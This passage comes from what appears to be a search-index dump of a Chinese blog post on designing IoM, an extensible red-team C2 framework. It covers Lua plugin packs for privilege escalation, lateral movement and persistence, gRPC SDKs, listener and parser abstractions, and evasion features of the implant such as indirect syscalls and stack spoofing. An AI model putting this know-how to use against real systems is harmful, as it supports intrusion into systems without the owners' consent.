\u4e5f\u5bf9\u80fd\u529b\u66f4\u5f3a\u7684\u5f00\u53d1\u8005\u4fdd\u7559\u4e86\u5b8c\u6574\u7684SDK\u4ee5\u53ca\u975e\u5e38\u591a\u53ef\u4ee5\u4e8c\u5f00\u7684\u63a5\u53e3\u3002 </p> <p>\u5728\u672c\u6587\u53d1\u5e03\u65f6\uff0c\u5df2\u7ecf\u5b9e\u73b0\u672c\u6587\u63d0\u5230\u7684100%\u7684\u5185\u5bb9\uff0c\u5747\u53ef\u4ee5\u5728\u6211\u4eec\u7684github\u4e2d\u627e\u5230</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#client\u7aef","title":"Client\u7aef","text":""},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#\u751f\u6001","title":"\u751f\u6001","text":"<p>CS\u65e9\u671f\u7248\u672c\u4e2d\u901a\u8fc7\u7528\u6237\u81ea\u53d1\u7684\u5f00\u6e90\u5f62\u6210\u4e86\u793e\u533a\u4e86, \u5728\u8fd1\u51e0\u5e74\u6dfb\u52a0\u4e86 https://cobalt-strike.github.io/community_kit/ \u5b98\u65b9\u7684\u793e\u533a\u63d2\u4ef6\u7d22\u5f15. </p> <p>sliver\u5219\u901a\u8fc7\u5728\u5b98\u65b9\u7edf\u4e00\u7ef4\u62a4\u4e86armory\u6b66\u5668\u5e93 , \u4f46sliver\u63d0\u4f9b\u7684\u62d3\u5c55\u80fd\u529b\u5f88\u6709\u9650, \u53ea\u80fd\u7b80\u5355\u6ce8\u518c\u547d\u4ee4, \u9884\u8bbe\u53c2\u6570. \u5728\u652f\u6301\u7684\u751f\u6001\u4e0a\u4e5f\u53ea\u6709 bof, dll, CLR. </p> <p>\u5728\u524d\u4eba\u7684\u5de5\u4f5c\u4e0a\u6539\u8fdbIoM\u7684\u63d2\u4ef6\u751f\u6001\u8bbe\u8ba1. \u6211\u4eec\u8ba1\u5212\u5728\u591a\u4e2a\u7ef4\u5ea6\u63d0\u4f9b\u4e0d\u540c\u9886\u57df\u7684\u62d3\u5c55\u80fd\u529b. </p> <p>\u6211\u4eec\u5728IoM\u7684\u8bbe\u8ba1\u6587\u6863\u4e2d\u63d0\u5230\u8fc7\u63d2\u4ef6\u76f8\u5173\u8bbe\u8ba1\u76ee\u6807 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#mals","title":"mals","text":"<p>mals\u662f\u4e3b\u8981\u7684\u9762\u5411\u7528\u6237\u7684\u62d3\u5c55\u63a5\u53e3\u3002 \u5c01\u88c5\u4e86\u5168\u91cf\u7684IoM\u7684\u529f\u80fd\uff0c\u7406\u8bba\u4e0a\u53ef\u4ee5\u4f7f\u7528lua\u5b9e\u73b0\u4e00\u4e2a\u529f\u80fd\u7b49\u4ef7\u7684cli\u7684\u751a\u81f3gui\u3002 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#\u8bed\u8a00\u65e0\u5173\u7684\u62d3\u5c55\u6027","title":"\u8bed\u8a00\u65e0\u5173\u7684\u62d3\u5c55\u6027","text":"<p>IoM\u5728\u6700\u521d\u7684\u8bbe\u8ba1\u4e0a\u60f3\u517c\u5bb9sliver\u7684armory(\u8fd9\u4e2a\u76f8\u5bf9\u7b80\u5355,\u5df2\u7ecf\u5b9e\u73b0), \u4ee5\u53cacobaltstrike\u7684<code>agressor_script</code>, \u5e76\u5728\u6b64\u57fa\u7840\u4e0a\u63d0\u4f9b\u81ea\u5df1\u7684\u63d2\u4ef6\u751f\u6001\u89c4\u8303, \u63d0\u4f9b\u8bed\u8a00\u65e0\u5173\u7684\u63d2\u4ef6\u89c4\u8303.</p> <p>\u7b80\u5355\u6765\u8bf4, \u5c31\u662f\u652f\u6301lua, go, python, java\u751a\u81f3\u662fyaklang\u7b49\u7b49\u4efb\u610f\u8bed\u8a00\u8fdb\u884c\u62d3\u5c55.</p> <p>(\u5f53\u7136\u6211\u4eec\u4e0d\u6253\u7b97\u4e5f\u6ca1\u6709\u8d44\u6e90\u5b9e\u73b0\u4e00\u5957\u7c7b\u4f3cyaklang\u7684VM, \u53ea\u80fd\u901a\u8fc7\u5728rpc\u4e0a\u7684\u89c4\u8303\u5b9e\u73b0\u591a\u8bed\u8a00SDK)</p> <p>\u5728 https://github.com/chainreactors/mals \u5b9e\u73b0\u4e86\u4e2d\u95f4\u7ed3\u6784\u4f53\uff0c\u80fd\u901a\u8fc7\u4e0d\u540c\u7684\u8bed\u8a00\u66b4\u9732\u540c\u4e00\u5957SDK\uff0c \u76ee\u524d\u4ee5lua\u4e3a\u4e3b\u8981\u7684\u62d3\u5c55\u8bed\u8a00\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#client","title":"client","text":"<p>\u4e0eCobaltStrike\u7684agressor_script\u7c7b\u4f3c, \u4e0d\u8bba\u662fServer\u7684rpc, Listener\u7684Parser, Implant\u7684module, \u90fd\u9700\u8981\u6700\u7ec8\u66b4\u9732\u5728\u63d2\u4ef6\u5f00\u53d1\u8005\u624b\u4e2d. </p> <p>agressor_script \u662f\u57fa\u4e8esleep\u8bed\u8a00\u5b9e\u73b0, sleep\u8f83\u5f3a\u4f9d\u8d56\u4e8ejava. \u5e76\u4e14\u4e5f\u8f83\u4e3a\u5c0f\u4f17, \u8981\u4e0d\u662fCS\u4f30\u8ba1\u5f88\u5c11\u6709\u4eba\u4e86\u89e3\u5b83. IoM\u6682\u65f6\u4e0d\u60f3\u80cc\u4e0a\u5df2\u6709\u7684\u5305\u88b1, \u5148\u653e\u5f00\u624b\u811a\u5927\u80c6\u8bbe\u8ba1, \u6240\u4ee5\u5bf9agressor_script\u517c\u5bb9\u7684\u4f18\u5148\u7ea7\u5728\u5b9e\u73b0\u6211\u4eec\u81ea\u5df1\u63d2\u4ef6\u751f\u6001\u4e4b\u540e. </p> <p>IoM\u9009\u62e9\u4e86lua\u4e0eTCL\u4f5c\u4e3a\u7b2c\u4e00\u9636\u6bb5\u51c6\u5907\u517c\u5bb9\u7684\u5d4c\u5165\u5f0f\u811a\u672c\u8bed\u8a00, lua/TCL\u811a\u672c\u4e0e<code>mal manifest</code>\u7ec4\u6210IoM\u63d2\u4ef6\u5305\u7684\u5355\u5143, \u5728client\u7aef\u63d0\u4f9b<code>mal</code>\u63d2\u4ef6\u7684.</p> <p>\u53ea\u9700\u8981\u5c06\u6240\u6709\u7684rpc\u5305\u88c5\u4e3abuildin\u51fd\u6570, \u6ce8\u518c\u5230lua/TCL\u4e2d, \u7136\u540e\u63d0\u4f9b\u4e00\u4e2a\u5305\u7ba1\u7406\u5668, \u7528\u6765\u7ba1\u7406\u52a0\u8f7d\u987a\u5e8f\u4e0e\u4f9d\u8d56\u5173\u7cfb. \u5f88\u7b80\u5355\u5c31\u80fd\u5b9e\u73b0\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u811a\u672c\u8bed\u8a00. </p> <p>\u4f46\u8981\u548cclient\u7684tui\u4ee5\u53ca\u672a\u6765\u53ef\u80fd\u51fa\u73b0\u7684gui\u4ea4\u4e92, \u8fd8\u9700\u8981\u591a\u505a\u4e00\u6b65. \u521a\u624d\u662f\u5c06rpc\u6ce8\u518c\u5230lua/TCL\u4e2d, \u73b0\u5728\u9700\u8981\u5c06\u7528\u6237\u811a\u672c\u7684\u6307\u5b9a\u89c4\u5219\u7684\u51fd\u6570\u53cd\u5411\u6ce8\u518c\u5230client\u7684\u547d\u4ee4, \u6216\u8005gui\u7684\u7ec4\u4ef6. </p> <p>\u6700\u7ec8\u6548\u679c\u5c31\u7c7b\u4f3cCS\u7684<code>agressor_script</code>\u7684\u8868\u8fbe\u529b. </p> <p>\u5f53\u7136, \u8fd9\u91cc\u9762\u8fd8\u6709\u5f88\u591a\u7ec6\u8282. \u4f8b\u5982\u6570\u636e\u4f20\u8f93\u683c\u5f0f, \u53c2\u6570\u4f20\u8f93\u683c\u5f0f\u7b49 \u9700\u8981\u6839\u636e\u5bf9\u5e94\u7684\u811a\u672c\u8bed\u8a00\u9002\u914d. </p> <p>\u540e\u7eed\u8fd8\u5c06\u63d0\u4f9b\u72ec\u7acb\u7684mals\u5ba2\u6237\u7aef\uff0c\u7c7b\u4f3c\u4e00\u4e2a\u811a\u672c\u89e3\u91ca\u5668\uff0c\u80fd\u4e4b\u95f4\u901a\u8fc7mals\u652f\u6301\u7684\u8bed\u8a00\u76f4\u63a5\u63a7\u5236implant\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#\u63d2\u4ef6\u7d22\u5f15\u4e0e\u63d2\u4ef6\u4ed3\u5e93","title":"\u63d2\u4ef6\u7d22\u5f15\u4e0e\u63d2\u4ef6\u4ed3\u5e93","text":"<p>\u5728v0.0.3\u53d1\u5e03\u540e, \u7ecf\u8fc7\u4e86\u4e00\u6bb5\u65f6\u95f4\u7684\u8fed\u4ee3\uff0c\u73b0\u5728\u5df2\u57fa\u672c\u5b9e\u73b0\u4e86\u8ba1\u5212\u4e2d\u7684\u4e00\u671f\u5de5\u7a0b\u3002 </p> <p>\u6211\u4eec\u4eceCobaltStrike\u8fc1\u79fb\u4e86\u6570\u767e\u4e2a\u4e0d\u540c\u7684\u63d2\u4ef6\u4f5c\u4e3a\u5143\u80fd\u529b, \u8fd9\u4e9b\u63d2\u4ef6\u5c06\u4f1a\u968f\u7740v0.1.0\u540c\u65f6\u53d1\u5e03</p> <ul> <li>community-lib ,\u5de5\u5177\u5e93, \u53ef\u4ee5\u5f53\u4f5c\u5e93\u88ab\u5176\u4ed6\u63d2\u4ef6\u4f7f\u7528<ul> <li>sharpblock</li> <li>No-Consolation</li> </ul> </li> <li>community-common, \u5e38\u7528\u5de5\u5177\u5305<ul> <li>OperatorsKit</li> <li>CS-Remote-OPs-BOF</li> <li>CS-Situational-Awareness-BOF</li> <li>chainreactor\u5de5\u5177</li> <li>misc \u672a\u5206\u7c7b\u7684\u5e38\u7528\u5de5\u5177\u96c6\u5408</li> <li>......</li> </ul> </li> <li>community-elevate \u63d0\u6743\u5de5\u5177\u5305</li> <li>community-proxy \u4ee3\u7406\u5de5\u5177\u5305</li> <li>community-move \u6a2a\u5411\u79fb\u52a8\u5de5\u5177\u5305</li> <li>community-persistence \u6743\u9650\u7ef4\u6301\u5de5\u5177\u5305</li> </ul> <p>\u540c\u65f6\uff0c \u6211\u4eec\u4e5f\u5728client\u4e0a\u5b9e\u73b0\u4e86\u5168\u81ea\u52a8\u4e0b\u8f7d\u5b89\u88c5\u7684\u529f\u80fd\uff0c\u53ea\u9700\u8981\u5728mals\u7684\u7d22\u5f15\u4e2d\u6dfb\u52a0\uff0c \u5c31\u80fd\u901a\u8fc7\u4e00\u884c\u547d\u4ee4\u81ea\u52a8\u4e0b\u8f7d\u5b89\u88c5\u3002 </p> <p>\u4f8b\u5982: <code>mals install community-common</code></p> <p>\u901a\u8fc7mal\u652f\u6301\u7684lua/yaegi(golang)\u7b49\u811a\u672c\u8bed\u8a00\uff0c \u80fd\u4ee3\u66ffclient\u64cd\u4f5cIoM\u7684\u5404\u79cd\u529f\u80fd\uff0c\u5e76\u5f62\u6210\u53ef\u590d\u7528\u7684\u63d2\u4ef6\u5305</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#server\u7aef","title":"Server\u7aef","text":""},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#sdk","title":"SDK","text":"<p>\u4e4b\u524d\u63d0\u5230\u8fc7, server\u4e0eclient\u7684\u4ea4\u4e92\u5168\u90fd\u901a\u8fc7grpc\u63d0\u4f9b\u7684rpc. </p> <p>\u901a\u8fc7grpc+protobuf\u63d0\u4f9b\u7684\u4e2d\u95f4\u5c42\uff0c \u6211\u4eec\u53ef\u4ee5\u751f\u6210\u591a\u8bed\u8a00\u7684RPC\u4ee3\u7801\u3002 \u8fd9\u4e2aRPC\u672c\u8eab\u5df2\u7ecf\u5b9e\u73b0\u4e86SDK\u9700\u8981\u768490%\u7684\u529f\u80fd\uff0c \u6211\u4eec\u7684client\u672c\u8d28\u4e0a\u4e5f\u662f\u57fa\u4e8e\u81ea\u52a8\u751f\u6210\u7684golang\u4ee3\u7801\u8fd0\u4f5c\u7684\uff0c \u6211\u4eec\u7684GUI\u5219\u662f\u81ea\u52a8\u751f\u6210\u7684javascript\u4ee3\u7801\u8fd0\u4f5c\u7684\uff0c\u6211\u4eec\u751a\u81f3\u6ca1\u6709\u8fdb\u884c\u591a\u5c11\u989d\u5916\u7684\u5de5\u4f5c\u5c31\u80fd\u5b9e\u73b0\u591a\u79cd\u8bed\u8a00\u7684\u8c03\u7528\u3002</p> <p>\u76ee\u524d\u6211\u4eec\u57fa\u4e8egolang\u548cjavascript\u5206\u522b\u5b9e\u73b0\u4e86TUI\u4e0eGUI\uff0c \u540e\u7eed\u6211\u4eec\u4f1a\u5c06\u76f8\u5173\u7684\u4ee3\u7801\u5c01\u88c5\u4e3aSDK\uff0c \u63d0\u4f9b\u57fa\u4e8egrpc+protobuf\u5b9e\u73b0\u7684\u591a\u8bed\u8a00SDK\u3002 \u521d\u6b65\u8ba1\u5212\u4e2d\uff0c \u6211\u4eec\u4f1a\u63d0\u4f9b\u4e09\u79cd\u8bed\u8a00\u7684SDK\uff0c \u5206\u522b\u662f:</p> <ul> <li>golang</li> <li>javascript</li> <li>python</li> </ul> <p>\u5bf9\u4e8e\u5176\u4ed6\u8bed\u8a00\uff0c\u5b9e\u9645\u4e0a\u53ea\u9700\u8981\u4f7f\u7528\u6211\u4eec\u7684 https://github.com/chainreactors/proto \u4ed3\u5e93\u5b89\u88c5\u5bf9\u5e94\u8bed\u8a00\u7684\u63d2\u4ef6\u751f\u6210\u4ee3\u7801\u5373\u53ef\u3002\u552f\u4e00\u7684\u9ebb\u70e6\u70b9\u5c31\u662f\u81ea\u884c\u7f16\u5199grpc+MTLS\u7684\u521d\u59cb\u5316\u8ba4\u8bc1\u6d41\u7a0b\u3002</p> <p>SDK\u4e0emals\u4e0d\u540c\u7684\u5730\u65b9\u5728\u4e8e\uff0c mals\u7ecf\u8fc7\u4e86\u4e00\u5c42\u5c01\u88c5\uff0c \u62e5\u6709\u66f4\u597d\u7684\u7528\u6237\u4f53\u9a8c\uff0c \u7279\u522b\u662f\u5728implant\u64cd\u4f5c\u4e0a\u7684\u76f8\u5173\u51fd\u6570\u3002 </p> <p>\u800cSDK\u662f\u539f\u59cb\u7684rpc\u63a5\u53e3\uff0c\u4ee3\u7801\u5373\u6587\u6863\uff0c \u9700\u8981\u4e00\u5b9a\u7a0b\u5ea6\u53c2\u8003rpc\u7684\u4ee3\u7801\u5b9e\u73b0\u53bb\u8c03\u7528\u3002 </p> <p>\u901a\u8fc7grpc\u652f\u6301\u7684\u4efb\u610f\u8bed\u8a00\uff0c \u90fd\u80fd\u5feb\u901f\u751f\u6210\u5bf9\u5e94\u8bed\u8a00\u7684SDK\uff0c\u5e76\u4e0eIoM\u8fdb\u884c\u4ea4\u4e92</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#listener","title":"Listener","text":"<p>\u5982\u679c\u9605\u8bfb\u8fc7\u6211\u4eec\u7684\u8bbe\u8ba1\u7684\u6587\u6863\u6216\u8005\u84dd\u56fe, \u5e94\u8be5\u77e5\u9053IoM\u4e00\u76f4\u5c06webshell\u5217\u5728\u8ba1\u5212\u4e2d. \u90a3IoM\u8ba1\u5212\u5982\u4f55\u5b9e\u73b0webshell\u5462?</p> <p>\u5b9e\u9645\u4e0a\u5c31\u662f\u5728Listener\u4e2d\u505a\u6587\u7ae0. \u5047\u8bbeIoM\u5c1d\u8bd5\u517c\u5bb9\u51b0\u874e, \u90a3\u4e48\u5b9e\u9645\u4e0a\u5c31\u662f\u9700\u8981\u4e00\u4e2a\u51b0\u874e\u7684\u52a8\u6001\u6570\u636e\u751f\u6210\u5668\u548c\u89e3\u91ca\u5668. \u5bf9\u4e8e\u9ed8\u8ba4\u7684implant(malefic)\u4e5f\u662f\u4e00\u6837, \u901a\u8fc7protobuf, \u5c06message\u5e8f\u5217\u5316\u6210bytes, \u5c06bytes\u89e3\u6790\u4e3amessage. </p> <p>\u8fd9\u91cc\u5c31\u53ef\u4ee5\u5c06\u5176\u53d8\u6210\u62bd\u8c61\u63a5\u53e3:</p> <ul> <li>parser \u8d1f\u8d23\u89e3\u6790\u56de\u4f20\u6570\u636e</li> <li>generator \u5c06spite\u8f6c\u4e3a\u76ee\u6807\u80fd\u7406\u89e3\u7684\u6570\u636e</li> </ul> <p>\u6211\u4eec\u8fd8\u53ef\u4ee5\u505a\u5f97\u66f4\u591a, \u8fd9\u4e2a\u529f\u80fd\u4e5f\u662f\u4e3a\u4e86\u7b2c\u4e09\u65b9C2\u7559\u7684. </p> <p>\u5982\u679c\u6709\u5927\u4f6c\u81ea\u5df1\u5b9e\u73b0\u4e86\u4e00\u4e2aC2, \u4f46\u662f\u51fa\u4e8e\u5de5\u4f5c\u91cf\u4e0e\u65f6\u95f4\u7684\u5173\u7cfb, cli/gui\u5199\u5f97\u975e\u5e38\u7c97\u7cd9\u600e\u4e48\u529e?</p> <p>\u5f88\u7b80\u5355, \u53ef\u4ee5\u5b8c\u5168\u4e0d\u78b0implant ,\u53ea\u9700\u8981\u5728listener\u4e2d\u6dfb\u52a0\u4e00\u4e2aparser\u4e0egenerator. \u5373\u53ef\u8ba9IoM\u7684server/listener/client\u4e09\u7aef\u7684\u751f\u6001\u8fc1\u79fb\u5230\u81ea\u5b9a\u4e49C2\u4e2d.</p> <p>\u5f53\u7136\u8981\u5b9e\u73b0\u65e0\u7f1d\u8fc1\u79fb\u8fd8\u662f\u9700\u8981\u4e00\u4e9b\u57fa\u672c\u7684\u5de5\u4f5c\u7684. \u4f8b\u5982\u652f\u6301Bof\u76f8\u5173\u529f\u80fd\u5f97implant\u539f\u672c\u5c31\u6709\u5bf9Bof\u7684\u652f\u6301. </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#pipeline","title":"Pipeline","text":"<p>pipeline\u76f8\u5f53\u4e8e\u4f20\u7edf\u7684C2\u6846\u67b6\u4e2d\u7684Listener\u3002 IoM\u8fdb\u4e00\u6b65\u7ec6\u5206\u4e86\u5176\u5185\u90e8\u5b9e\u73b0\uff0c \u6211\u4eec\u5c06\u76d1\u542c\u670d\u52a1\u5668\u6574\u4f53\u4f5c\u4e3alistener\uff0c \u6bcf\u4e2alistener\u4e0a\u90fd\u53ef\u4ee5\u8fd0\u884c\u591a\u4e2apipeline\uff0c pipeline\u662f\u4e0eimplant\u8fdb\u884c\u5177\u4f53\u4ea4\u4e92\u7684\u7ec4\u4ef6\u7684\u3002</p> <p>\u8fd9\u91cc\u7684\u4ea4\u4e92\u6307\u7684\u662f:</p> <ul> <li>beacon \u6a21\u5f0f\u4e0b\u89e3\u6790\u5bf9\u5e94\u7684\u5fc3\u8df3\u5305\u5e76\u8fd4\u56de\u6570\u636e</li> <li>bind/webshell \u6a21\u5f0f\u4e0b\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u4e3b\u52a8\u53d1\u5305</li> <li>website \u63d0\u4f9bhttp\u670d\u52a1\u7528\u6765\u5206\u53d1\u6587\u4ef6\u6216\u8005\u6c34\u5751</li> <li>rem \u63d0\u4f9b\u4ee3\u7406\uff0c\u7aef\u53e3\u8f6c\u53d1\uff0c\u6d41\u91cf\u4e2d\u8f6c\u7b49\u6d41\u91cf\u670d\u52a1</li> <li>...</li> </ul> <p>pipeline\u6bd4\u8d77Cobaltstrike\u7684listener\u7684\u8bbe\u8ba1\u66f4\u52a0\u7075\u6d3b\uff0c\u5e76\u4e14\u62e5\u6709\u66f4\u4e30\u5bcc\u7684\u529f\u80fd\u3002 </p> <p>\u5b9e\u9645\u4e0alistener\u63d0\u4f9b\u4e86\u5206\u5e03\u5f0f\u5c42\u9762\u7684\u62bd\u8c61\uff0c pipeline\u5219\u662f\u5176\u5177\u4f53\u5b9e\u73b0\uff0c \u4e24\u8005\u76f8\u8f85\u76f8\u6210\u3002</p> <p>\u901a\u8fc7\u5b9e\u73b0pipeline\u7684\u57fa\u672c\u63a7\u5236rpc\uff0c \u5c31\u53ef\u4ee5\u63a5\u5165\u4e0d\u540c\u5f62\u5f0f\u7684pipeline\uff0c \u4f8b\u5982\u4e91\u51fd\u6570, \u4ee3\u7406, LOLC2 \u7b49\u7b49</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#parser","title":"Parser","text":"<p>\u6bd4pipeline\u66f4\u52a0\u7ec6\u8282\u7684\u5b9e\u73b0\u662fparser\uff0c parser\u63d0\u4f9b\u4e86\u5177\u4f53\u534f\u8bae\u5b9e\u73b0\u7684\u62bd\u8c61\u3002\u4f8b\u5982malefic\u9ed8\u8ba4\u7684\u901a\u8baf\u534f\u8bae\u662f\u8fd9\u6837\u7684:</p> <pre><code>graph TD\n    subgraph TLS\n        subgraph Encryption\n            subgraph \u5185\u90e8\u7ed3\u6784\n                ProtocolHeader[Protocol Header]\n                Protobuf[Protobuf]\n            end\n        end\n    end</code></pre> <p>\u901a\u8fc7\u4fee\u6539parser\uff0c \u6211\u4eec\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u4f20\u8f93\u534f\u8bae\u683c\u5f0f\u3002 \u66f4\u53ef\u4ee5\u901a\u8fc7parser\uff0c \u5c06\u5176\u4ed6C2\u6846\u67b6\u63a5\u5165\u5230IoM\u4e2d\uff0c \u53c8\u6216\u8005\u5c06IoM\u4f5c\u4e3a\u5176\u4ed6C2\u6846\u67b6\u7684external listener\u3002</p> <p>\u901a\u8fc7\u5b9a\u5236\u4e0d\u540c\u7684parser\uff0c\u53bb\u9002\u914d\u4e0d\u540c\u7684C2 implant\u3002 \u53ef\u4ee5\u5c06\u534f\u8bae\u5b8c\u5168\u4e0d\u540c\u7684C2\u63a5\u5165\u5230IoM\u4e2d\uff0c \u4e5f\u53ef\u4ee5\u5c06IoM\u4f5c\u4e3a\u4e0d\u540cC2\u7684redirecter</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#implant\u7aef","title":"Implant\u7aef","text":"<p>implant \u7aef\u7684\u62d3\u5c55\u6027\u662f\u91cd\u4e2d\u4e4b\u91cd\u3002 \u6211\u4eec\u8ba1\u5212\u4e2d\u5c06\u652f\u6301\u5bf9\u7f16\u8bd1\uff0c\u94fe\u63a5\uff0c\u529f\u80fd\uff0c\u9759\u6001\uff0c\u52a8\u6001\uff0c\u5185\u5b58\uff0c\u6d41\u91cf\u7b49\u7b49\u65b9\u65b9\u9762\u9762\u8fdb\u884c\u91cd\u8f7d\uff0c\u81ea\u5b9a\u4e49\uff0c\u53ef\u62d3\u5c55\u3002</p> <p>\u76f8\u5173\u4ee3\u7801\u53ef\u4ee5\u5728github\u4ed3\u5e93\u4e2d\u627e\u5230: https://github.com/chainreactors/malefic</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#features","title":"features","text":"<p>rust\u6700\u5f3a\u5927\u7684\u5730\u65b9\u5c31\u5728\u4e8e\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7ec6\u7c92\u5ea6\u6781\u9ad8\u7684\u6761\u4ef6\u7f16\u8bd1\u7684\u8bed\u6cd5\u7cd6\u4ee5\u53ca\u66f4\u5f3a\u5927\u7684\u8fc7\u7a0b\u5b8f\uff08\u7f16\u8bd1\u65f6\u5c55\u5f00\u7684\u5b8f\uff09\uff0c \u8ba9\u6211\u4eec\u53ef\u4ee5\u66f4\u52a0\u7b80\u5355\u7684\u5b9e\u73b0\u975e\u5e38\u590d\u6742\u7684\u5404\u81ea\u62d3\u5c55\u529f\u80fd\u3002 </p> <p>\u73b0\u5728malefic\u7684\u7edd\u5927\u90e8\u5206\u62d3\u5c55\u80fd\u529b\u90fd\u662f\u57fa\u4e8efeatures\u6784\u5efa\u7684\uff0c \u5e76\u63d0\u4f9b\u4e86malefic-mutant\u5c06<code>config.yaml</code>\u8f6c\u4e3a\u914d\u7f6e\u597d\u7684cargo.toml\u3002 </p> <p>\u53ef\u4ee5\u5728 https://github.com/chainreactors/malefic/blob/master/malefic-modules/src/lib.rs \u770b\u5230\u4e00\u4e2a\u6bd4\u8f83\u76f4\u89c2\u7684\u4f8b\u5b50\u3002 \u6211\u4eec\u901a\u8fc7feature\u5b9e\u73b0\u4e86module\u7684\u52a8\u6001\u6309\u9700\u7ec4\u88c5\u3002</p> <p>\u901a\u8fc7\u63a7\u5236\u4e0d\u540c\u7684features\u7684\u7ec4\u5408\uff0c\u53ef\u4ee5\u5c06IoM implant\u62c6\u89e3\u4e3a\u4e50\u9ad8\u79ef\u6728\uff0c \u7f16\u8bd1\u65f6\u52a8\u6001\u62fc\u88c5</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#kits","title":"kits","text":"<p>kit\u662f\u5b98\u65b9\u63d0\u4f9b\u7684\u7279\u5b9a\u64cd\u4f5c\u7cfb\u7edf\u7684\u5de5\u5177\u5305\uff0c \u7528\u6765\u5b9e\u73b0\u5404\u81ea\u8fdb\u9636\u529f\u80fd\uff0c \u5e76\u7531\u6211\u4eec\u6765\u7ef4\u62a4\u5176opsec\u4e0e\u7a33\u5b9a\u6027\u3002\u5728\u6bcf\u4e2a\u7248\u672c\u53d1\u5e03\u65f6\u4f1a\u901a\u8fc7 <code>.a/.lib</code> \u53d1\u5e03\u5bf9\u5e94\u7684\u9759\u6001\u94fe\u63a5\u5e93, \u4e5f\u662f**\u76ee\u524dIoM\u4e2d\u552f\u4e00\u4e0d\u5b8c\u5168\u5f00\u6e90**\u7684\u7ec4\u6210\u90e8\u5206\u3002 </p> <p>\u76ee\u524d\u6211\u4eec\u53ea\u63d0\u4f9b\u4e86win-kit , \u5176\u4e2d\u5305\u542b\u4e86\u5341\u6570\u4e2a offensive security \u7684\u529f\u80fd\uff0c \u5305\u62ec  BOF, CLR, indirect syscall, stack spoof\u7b49\u7b49.</p> <p>\u8fd9\u90e8\u5206\u662f\u7531\u6211\u4eec\u7ef4\u62a4\u7684\u5e95\u5c42\u57fa\u7840\u8bbe\u65bd\uff0c\u6211\u4eec\u5c06\u4f1a\u4e3a\u4e0d\u540c\u7684\u4f7f\u7528\u573a\u666f\u76ee\u6807\u7528\u6237\u5b9a\u5236\u4e0d\u540c\u7684kit,  \u514d\u53bbC2\u5f00\u53d1\u4e2d\u6700\u4e3a\u590d\u6742\u7684\u6280\u672f\u7ec6\u8282\uff0c 